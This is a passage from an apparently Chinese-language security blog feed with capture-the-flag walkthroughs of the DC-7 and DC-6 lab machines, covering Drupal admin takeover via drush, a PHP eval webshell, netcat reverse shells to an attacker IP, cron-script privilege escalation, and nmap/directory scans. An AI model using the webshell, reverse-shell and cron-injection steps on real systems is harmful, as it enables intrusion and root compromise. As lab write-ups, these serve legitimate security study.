alt="img"></p><p>但是在执行保存的时候被拒绝执行了。</p><p>那我们可以新建一个文件啊，替换掉原来的。通过尝试，发现也不行。</p><p>总的来说，我们有权限执行<code>backups.sh</code>文件，但尝试修改<code>backups.sh</code>脚本文件失败。</p><h4 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h4><p>既然尝试修改<code>backups.sh</code>文件失败，那就尝试漏洞搜寻，看看能不能利用漏洞提权。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit exim 4<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721995081467.png" alt="img"></p><p>刚好发现有一个符合版本条件的。使用<code>-p</code>选项查看其详细信息。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721995160390.png" alt="img"></p><p>cat一下查看文件的详细内容。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721995287152.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721995312041.png" alt="img"></p><p>通过漏洞版本右边的提示<code>&#39;BDAT&#39; Denial of Service </code>可以知道它使用的是<code>BDAT拒绝服务攻击&#39;</code>，有关这个攻击的介绍好像比较少：<a href="https://ti.qianxin.com/uploads/2018/01/26/12bf53828dc9c468e47104459b0f2bbc.pdf">Exim 服务器 BDAT 指令远程代码执行漏洞-奇安信报告</a>，虽然它给出了利用命令，但是不大确定行不行啊。</p><p>而且尝试过后，命令报错了。可能还得做其它的设置，有点麻烦。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721995866099.png" alt="img"></p><p>使用<code>Metasploit</code>找一找吧！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search exim 4<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721995952245.png" alt="img"></p><p>发现编号为1的漏洞，其exim版本号刚好符合我们的要求，而且危险等级也是excellent，时间也很新。尝试利用一下这个漏洞。</p><p><a href="https://www.cnblogs.com/R1card0/articles/12960290.html">metasploit实战（一）local_exploit_suggester提权</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721996262841.png" alt="img"></p><p>emm……不会利用啊（上面的链接看着挺类似，但是稍微复杂）。明显，要是我们死磕漏洞利用的话，那可能会花费很多时间。</p><p>码垛！看来又得切换思路了。</p><h4 id="3-命令执行"><a href="#3-命令执行" class="headerlink" title="3.命令执行"></a>3.命令执行</h4><p>之前我们使用find命令对具有SUID权限的命令进行了搜索，也对其中提权成功的可能性较高的命令进行了尝试，但是发现均行不通。</p><p>不过别灰心，我们在上一步信息检索的时候发现了 <code>/opt/scripts/backups.sh</code>这个重要的文件，而且通过测试发现我们对这个脚本文件具有执行权限。言外之意就是，对脚本中使用到的所有命令都具有执行权限。</p><p>脚本中使用到的关键命令为：<code>drush</code>和<code>gpg</code>。</p><p>在脚本文件中。<code>drush</code> Drupal shell 工具主要用于生成数据库备份，sql-dump命令将Drupal数据库导出到目标文件中。<code>gpg</code>主要对文件进行加密。</p><p>通过网络搜索查找关于这两个命令的更详细功能：</p><blockquote><p><code>drush</code>：是一个shell接口，可以直接从云服务器使用命令行管理Drupal。</p><p><a href="https://blog.csdn.net/xuanunix/article/details/135921223">Drush初学者指南：Drupal Shell</a></p><p><a href="https://blog.csdn.net/single_g_l/article/details/126322111">Drupal drush 常用命令</a></p><p>其中，提到了<code>drush</code>拥有更改用户密码的功能：</p><p><code>drush user-password admin --password=&quot;new_pass&quot;</code></p><p><code>gpg</code>：对文件进行加密&#x2F;解密&#x2F;签名。</p><p><a href="https://blog.csdn.net/willingtolove/article/details/122362705">GPG使用方法总结（密钥管理，加解密文件）</a></p></blockquote><p>利用<code>drush</code>拥有更改用户密码的功能，我们是否能够修改root用户的密码呢！</p><p>可以尝试一下！首先，我们之前在进行网页信息检索测试的时候，发现了<code>admin</code>是目标网站的一个合法用户名，那么我们可以尝试对该用户进行密码更新，再通过ssh连接或者su用户切换验证效果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">drush user-password admin --password=<span class="hljs-string">&quot;123456&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722004424388.png" alt="img"></p><p>发生错误提示：</p><blockquote><p>Command user-password needs a higher bootstrap level to run - you will need to invoke drush from a more functional Drupal environment to run this command. The drush command ‘user-password admin’ could not be executed.  </p><p>言外之意就是要找到更高级别的引导权限目录才能成功执行drush命令呗。    </p></blockquote><p>因为drush是一款Drupal shell工具，Drupal又是一个网页CMS框架，直接去web服务器的根目录进行操作呗，试试看。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/<br>drush user-password admin --password=<span class="hljs-string">&quot;123456&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722005001057.png" alt="img"></p><p>修改成功！</p><p>之前是在网页的登陆网站上发现了提示”admin“为合法用户的信息，而且drush工具也是在web服务器的根目录下才运行成功的，那验证自然也去登陆网页上进行验证。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722005189250.png" alt="img"></p><p>成功了捏！登陆了管理员系统。</p><p>在dc7user账户信息检索过程中，虽然我们没有成功提权，获得数据库备份数据文件，但是我们通过了drush工具成功修改了管理员的网页系统账户。也算是一个大大的收获</p><h3 id="后台管理系统信息检索"><a href="#后台管理系统信息检索" class="headerlink" title="后台管理系统信息检索"></a>后台管理系统信息检索</h3><p>回顾之前通过网页进行getshell的操作，无非是①利用注入点上传一句话木马然后用中国蚁剑进行连接触发，②利用文件包含等漏洞注入一句话木马或反弹shell命令。</p><p>所以对于这个后台管理系统的网页，要想getshell也是同理。</p><p>如果从漏洞利用入手的话可能比较困难，因为在对之前的目录列表进行检索的过程中，并没有什么组成要素是明显地能看出来是属于两个文件的，也就是说文件包含漏洞暂时无法利用；通过之前的nmap扫描可以得知目标网站使用的CMS 框架是 Drupal 在之前对dc7user进行提权的时候我们尝试过漏洞利用，但是失败了。</p><p>所以我们的重点可以放在寻找可以注入一句话木马的注入点注入一句话木马来尝试getshell。</p><p>在搜索<code>content</code>板块的时候，我们看到了我们之前在以游客身份访问目标网站的时候出现的所有可能响应界面内容，可以看到它们的内容类型都是<code>Basic page</code>。用户通过网站提交请求后会根据后台设置的不同条件返回相应的响应界面给操作用户。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722084389560.png" alt="img"></p><p>点进去欢迎界面进行查看：</p><p>有标题、内容以及文本格式等可操作选项。既然网站能够执行并响应显示这些内容，说明后台可能对这几部分内容有对应的代码操作模块。</p><p>也就是说，这里可以作为一个一句话木马的注入点。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722084587047.png" alt="img"></p><p>尝试新建一个页面，在<code>body</code>处写入一句话木马：</p><blockquote><?php @eval($_POST['shell']); ?></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722084234331.png" alt="img"></p><p>写入的一句话木马是php文件，格式自然对应php，但是在下方的文件格式并没有php格式选项。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722084968257.png" alt="img"></p><p>通过搜索，可以知道Drupal 8 为了安全，已经默认不添加php格式解析模块，需要用户手动到扩展模块添加。</p><p>首先就是要查找php模块包的下载地址。</p><p>根据提示信息，那就点击超链接去<code>modules</code>模块寻找我们所需要的php模块包。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722085979531.png" alt="img"></p><p>搜索信息：drupal 8版本、php模块</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722086362763.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087300866.png" alt="img"></p><p>点击下面的<code>Read more</code>，下滑，可以看到有相应版本的压缩包。查看所有版本。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087351360.png" alt="img"></p><p>选择第一个进行下载吧，它看着好像挺可靠的。没有红的也没有黄的。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087443573.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087601508.png" alt="img"></p><p>右键复制下载链接地址，可别点击下到自己的主机了，没用的捏。</p><p>php模块包的下载地址：</p><blockquote><p><a href="https://ftp.drupal.org/files/projects/php-8.x-1.2.tar.gz">https://ftp.drupal.org/files/projects/php-8.x-1.2.tar.gz</a></p></blockquote><p>回到模块下载页面，输入链接进行下载：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087651737.png" alt="img"></p><p>是太安全了吗？（流汗黄豆）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087719295.png" alt="img"></p><p>换第二个不安全的链接试试：</p><blockquote><p><a href="https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz">https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz</a></p></blockquote><p>噢！码垛，真给他下载成功了。（两颗流汗黄豆）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087831235.png" alt="img"></p><p>选择如下选项：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087887054.png" alt="img"></p><p>返回之前要注入一句话木马的界面，发现这个时候还是没有php格式的选项：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722087999896.png" alt="img"></p><p>去扩展模块搜搜看是怎么回事吧。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722088047212.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722088082600.png" alt="img"></p><p>还需要下载！！！！</p><p>现在再回去看，就发现已经有了<code>PHP code</code>选项  </p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722088121510.png" alt="img"></p><h3 id="一句话木马注入"><a href="#一句话木马注入" class="headerlink" title="一句话木马注入"></a>一句话木马注入</h3><blockquote><?php @eval($_POST['shell']); ?></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722088257803.png" alt="img"></p><p>保存<code>Save</code>，然后就会跳转到该网页：<a href="http://192.168.204.136/node/4">http://192.168.204.136/node/4</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722088339240.png" alt="img"></p><p>使用中国蚁剑进行连接测试。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722088475791.png" alt="img"></p><p>码垛，逆子！</p><p>想开点，或许是新建的网页页面没有权限呢！</p><p>那直接对首页页面进行修改注入吧</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722088595614.png" alt="img"></p><p>仍然报错。</p><blockquote><p>码垛！从最开始进行一句话木马的时候就已经错了。不是随便在哪种文档格式<code>text format</code>下写入再转换都行，会发生歧义的。</p><p>由于编辑界面进去，原文件默认使用的是html格式，所以会默认选择并以html格式显示数据。如果在该格式下直接将一句话木马复制上去的话，那就会被浏览器当作是html文本，再切换为<code>PHP code</code>的时候就会被浏览器解析成将一句话木马的文本转换为php格式。与我们写入的语义完全不一样了。</p><p>那个<code>&lt;P&gt;&lt;/P&gt;</code>标签就表示了其中的一句话内容是文本。那测试连接又怎么会成功执行一句话木马？</p><p>所以，需要一开始就先转化为<code>PHP code</code>，再复制一句话木马进去。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722091222475.png" alt="img"></p><p>要让一句话木马在<code>PHP code</code>格式下也显示为我们复制进去的模样。</p><p>在中国蚁剑测试连接：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722091249617.png" alt="img"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>打开虚拟终端，执行反弹shell命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/bash 192.168.204.128 9999<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722091441795.png" alt="img"></p><p>提前在终端打开监听，成功get到反弹来的shell。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722091421612.png" alt="img"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看具有SUID权限的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722092334695.png" alt="img"></p><p>同样的，参照以往的经验，成功率较大的命令提权是exim4，根据上述开发者提供的信息，使用的是exim 4.89，在尝试利用的时候，发现它主要是通过<code>BDAT拒绝服务攻击</code>实现的。有关于这个漏洞攻击的参考资料较少，相关的参考，其实现起来也比较复杂。</p><p>尝试切换思路。对开发者账户的那个<code>backups.sh</code>耿耿于怀。</p><p>之前我们在开发者账户中，通过尝试证明了我们（开发者普通用户状态）具有执行脚本的权限，但是没有修改脚本的权限。显然，修改脚本文件所需要的权限更高。</p><p>使用<code>ls -l</code>查看该脚本文件的属主和属组情况。（当然是在开发者账户哈）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722092909249.png" alt="img"></p><p>得到如下信息：</p><blockquote><p>-rwxrwxr-x：文件所有者（root）具有rwx读、写、执行权限，文件所在组（www-data）具有rwx读、写、执行权限，其它用户（r-x）只具有读和执行权限。</p><p>1：文件的硬链接计数。对于普通文件，这个数字通常是 1，表示文件只有一个链接</p><p>root：文件所有者user</p><p>www-data：文件所属组group</p><p>520：文件大小，以字节为单位</p><p>Aug 29  2019：文件的最后修改日期</p><p>backups.sh：文件名</p></blockquote><p>简而言之，这个文件的所有者是root，之前我们进行反弹shell的时候，也是反弹所在用户的shell。</p><p>那么利用<code>root：文件所有者user; www-data：文件所属组group</code>这两个信息，在www-data端对脚本文件进行修改，注入反弹shell命令，然后执行，尝试反弹脚本所有者root的权限。</p><p>根据之前在开发者账户收到的邮件信息：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722093747595.png" alt="img"></p><p>可以发现，数据库备份的操作总是由root执行，那么它记录的相关信息记录也应该是root方的信息，包括脚本文件的位置。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722093843445.png" alt="img"></p><p>果然。接下来就对脚本文件进行编辑吧。</p><p>使用<code>nano</code>命令修改脚本文件受阻，可能是由于远程连接不稳定的因素造成的。</p><p><code>vim</code>命令也不行，提示<code>command not found</code>，没有这个命令捏</p><p>那就使用<code>echo</code>命令将反弹shell的命令追加到脚本文件中！！！</p><blockquote><p>覆盖写入使用一个<code>&gt;</code></p><p>追加写入使用两个<code>&gt;&gt;</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;nc -e /bin/bash 192.168.204.128 6666&quot;</span> &gt;&gt; backups.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722094500045.png" alt="img"></p><p>ok！追加成功。码垛，发现反弹回来的是<code>www-data</code>属组的shell。可能因为在执行脚本文件中的命令时，实际上是调用用户的命令权限执行的，也就是说，相当于是<code>www-data</code>属组执行了反弹shell，反弹回来的当然是<code>www-data</code>属组的命令。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722094610411.png" alt="img"></p><p>别忘了，普通用户也有执行权限，修改文件成功之后，可以让开发者用户去执行这个脚本文件。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722094858294.png" alt="img"></p><p>可以看到，<code>dc7user</code>处的<code>backups.sh</code>文件内容也跟着修改了。尝试执行！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722094992931.png" alt="img"></p><p>坏，也是反弹回<code>dc7user</code>的权限了。<code>dc7user</code>的问题和<code>www-data</code>的一样。</p><p>回顾之前的<code>dc7user</code>收到的邮件内容，发现它的每封邮件都是在04秒发送，而且两封邮件之间规律性地相隔15分钟，感觉像是定时任务。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722095478559.png" alt="img"></p><blockquote><p>**<code>Cron</code>**：指示这是 <code>cron</code> 服务相关的日志信息。</p><p><code>Cron</code> 是一个 Unix&#x2F;Linux 系统中的任务调度程序，它用于按 预设的时间计划 执行命令或脚本。</p></blockquote><p>果然是定时执行，那既然我们已经成功修改了脚本文件，那就等待root用户的定时任务自动触发脚本吧。</p><p>等待！</p><p>ok ！给我等到了！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722096051733.png" alt="img"></p><p>ok！找flag！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722096152218.png" alt="img"></p><p>cat！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1722096165290.png" alt="img"></p><p>ok！成功了。至此，所有任务结束。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>首先就是这个跳出惯性思维的过程。不仅限于技术攻克，有时候可以通过一些可能不经意被泄露出来的用户信息，通过社会工程攻击，来获取一些重要信息。</li><li><code>echo</code>命令可以对脚本文件（.sh）进行覆写<code>&gt;</code>或追加<code>&gt;&gt;</code></li><li>信息检索是一个比较庞大的工程，需要仔细且不放过任何细节。</li><li>本次提权利用的是<code>root</code>用户设置的<code>Cron</code>定时任务，获得反弹shell的</li><li><code>ls -l</code>查看文件属组和属主信息</li><li>后台管理系统最重要的就是能够获取webshell，拿到站点才有机会进一步提权</li><li>一些脚本文件中可能存在可以利用的地方，比如<code>脚本中的命令</code>。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-6</title>
    <link href="/2024/07/30/DC-6/"/>
    <url>/2024/07/30/DC-6/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>通过开关靶机来确认目标靶机的IP地址：</p><p>开靶机前：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721466473726.png" alt="img"></p><p>开靶机后：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721466588758.png" alt="img"></p><p>可以确认，目标靶机的IP地址为：<code>192.168.204.135</code></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="nmap和tcp端口扫描"><a href="#nmap和tcp端口扫描" class="headerlink" title="nmap和tcp端口扫描"></a>nmap和tcp端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN -p- 192.168.204.135<br>nmap -sT -p- 192.168.204.135<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721473317554.png" alt="img"></p><p>由端口扫描可以知道，目标靶机开放的端口有：<code>22</code>和<code>80</code>端口，它们分别对应着ssh服务和http服务。</p><p>好！这时候有关getshell的思路就可以有了：hydra爆破远程连接账户、网页信息检索&amp;CMS框架漏洞利用。</p><h3 id="端口详细扫描"><a href="#端口详细扫描" class="headerlink" title="端口详细扫描"></a>端口详细扫描</h3><p>查看更详细的端口信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 22,80 192.168.204.135<br></code></pre></td></tr></table></figure><p>扫描结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721473643269.png" alt="img"></p><p>其中，显示的有效信息有：</p><blockquote><p>22端口使用的ssh版本为：OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</p><p>22端口的主机密钥（十六进制表示格式）</p><p>80端口的网页似乎被重定向了：</p><p>Did not follow redirect to <a href="http://wordy/">http://wordy/</a></p><p>并未遵从重定向到<a href="http://wordy/">http://wordy/</a></p></blockquote><p>此时，可以先浅访问一下目标靶机的网站。（192.168.204.135）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721474020587.png" alt="img"></p><p>果然，网页被重定向了。</p><h2 id="namp漏扫"><a href="#namp漏扫" class="headerlink" title="namp漏扫"></a>namp漏扫</h2><p>为了获取更多的信息，可以再进行namp扫描，看看能不能获得更多有用的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 22,80 192.168.204.135<br></code></pre></td></tr></table></figure><p>扫描结果如下：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721474459724.png" alt="img"></p><p>！！！发现了一些<code>wordpress</code>用户名（wordpress是一种CMS框架捏），而且看情况，这些用户名由于用户限制并没有完全显现完。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721474619631.png" alt="img"></p><blockquote><p>admin</p><p>graham</p><p>mark</p><p>sarah</p><p>jens</p></blockquote><p>除此之外，<code>http-enum</code>还提供了与WordPress相关的各种发现：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721474725052.png" alt="img"></p><p>是各种类型的文件：</p><blockquote><p>&#x2F;wp-login.php: Possible admin folder（可能是管理目录）</p><p>&#x2F;readme.html: Wordpress version: 2</p><p>&#x2F;wp-includes&#x2F;images&#x2F;rss.png: Wordpress version 2.2 found.</p><p>&#x2F;wp-includes&#x2F;js&#x2F;jquery&#x2F;suggest.js: Wordpress version 2.5 found.</p><p>&#x2F;wp-includes&#x2F;images&#x2F;blank.gif: Wordpress version 2.6 found.</p><p>&#x2F;wp-includes&#x2F;js&#x2F;comment-reply.js: Wordpress version 2.7 found.</p><p>上述各个文件所使用的Wordpress版本号涉及2、2.2、2.5、2.6、2.7.</p><p>&#x2F;wp-login.php: Wordpress login page.（Wordpress登陆界面）</p><p>&#x2F;wp-admin&#x2F;upgrade.php: Wordpress login page.（Wordpress登陆界面）</p><p>&#x2F;readme.html: Interesting, a readme.（一份说明文件）</p></blockquote><h2 id="重定向修改"><a href="#重定向修改" class="headerlink" title="重定向修改"></a>重定向修改</h2><p>上面进行端口扫描得到的信息显示重定向失败:</p><blockquote><p>Did not follow redirect to <a href="http://wordy/">http://wordy/</a></p><p>并未遵从重定向到<a href="http://wordy/">http://wordy/</a></p></blockquote><p>需要修改本地host文件，这里就在kali内部修改其host文件吧~</p><blockquote><p>打开 <code>etc/hosts</code>文件，添加本地DNS记录 <code>192.168.204.135 wordy</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/hosts<br></code></pre></td></tr></table></figure><p>添加完成后保存，退出。重新访问目标靶机的网站。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721475758895.png" alt="img"></p><p>ok！成功正常访问目标靶机网站。</p><h2 id="网页信息检索"><a href="#网页信息检索" class="headerlink" title="网页信息检索"></a>网页信息检索</h2><h3 id="网页模块信息检索"><a href="#网页模块信息检索" class="headerlink" title="网页模块信息检索"></a>网页模块信息检索</h3><p>访问目标网站，其网页主要有三个内容模块：Welcome、About Us、Contact Us。</p><p>在Welcome中，它主要展示了wordy的主要运营产品：是WordPress插件和安全。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721476116046.png" alt="img"></p><p>在About Us中，主要展示了wordy的可信力，人力资源：主要开发者 jens 很厉害，jens 这个名字在前面的nmap漏扫也破获出来了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721476235722.png" alt="img"></p><p>在Contact Us中，主要就是欢迎的话语，没有任何有用的提示。</p><h3 id="Wapplayzer指纹识别"><a href="#Wapplayzer指纹识别" class="headerlink" title="Wapplayzer指纹识别"></a>Wapplayzer指纹识别</h3><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721476518153.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721480942802.png" alt="img"></p><p>如我们所料，目标网站使用的CMS框架果然是<code>WordPress</code>。到时候可以通过查找有关WordPress的漏洞进行利用。</p><p>为了提高容错率，我们还需要收集更多可能会有用的信息，因而我们可以先进行目录爆破。</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><h3 id="gobuster爆破"><a href="#gobuster爆破" class="headerlink" title="gobuster爆破"></a>gobuster爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.135 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721481500953.png" alt="img"></p><blockquote><p>获得目录：</p><p><a href="http://192.168.204.135/wp-content/">http://192.168.204.135/wp-content/</a></p><p><a href="http://192.168.204.135/wp-includes/">http://192.168.204.135/wp-includes/</a></p><p><a href="http://192.168.204.135/wp-admin/">http://192.168.204.135/wp-admin/</a></p></blockquote><h3 id="dirsearch爆破"><a href="#dirsearch爆破" class="headerlink" title="dirsearch爆破"></a>dirsearch爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u  http://192.168.204.135<br>dirsearch -u  http://192.168.204.135 -x 403,404,405,500<br>dirsearch -u  http://192.168.204.135 -x 400-500<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721481597223.png" alt="img"></p><p>不难看出，扫描的目录与响应状态有关，其中也有一些<code>4xx</code>和<code>5xx</code>系列的错误状态码数据包（对我们没啥用处的），所以我们可以在爆破之初，添加<code>-x</code>选项。</p><p><code>-x</code> ：不显示指定的状态码，指定多个通过逗号分隔，或者指定一个范围，两个数之间使用<code>-</code>连接。</p><p><code>2xx</code>：正常的正确响应</p><p><code>3xx</code>：重定向</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721483033212.png" alt="img"></p><blockquote><p>&#x2F;index.php</p><p>&#x2F;license.txt</p><p>&#x2F;readme.html</p><p>&#x2F;wp-admin&#x2F;install.php</p><p>&#x2F;wp-config.php</p><p>&#x2F;wp-content&#x2F;</p><p>&#x2F;wp-includes&#x2F;</p><p>&#x2F;wp-login.php</p><p>&#x2F;wp-cron.php</p><p><a href="http://192.168.204.135/wp-admin/">http://192.168.204.135/wp-admin/</a></p><p><a href="http://wordy/wp-login.php?redirect_to=http://192.168.204.135/wp-admin/&reauth=1">http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192.168.204.135%2Fwp-admin%2F&amp;reauth=1</a></p><p><a href="http://192.168.204.135/wp-content/">http://192.168.204.135/wp-content/</a></p><p><a href="http://192.168.204.135/wp-includes/">http://192.168.204.135/wp-includes/</a></p><p><a href="http://wordy/wp-login.php?action=register">http://wordy/wp-login.php?action=register</a></p></blockquote><h3 id="dirb爆破"><a href="#dirb爆破" class="headerlink" title="dirb爆破"></a>dirb爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb  http://192.168.204.135<br></code></pre></td></tr></table></figure><p><img 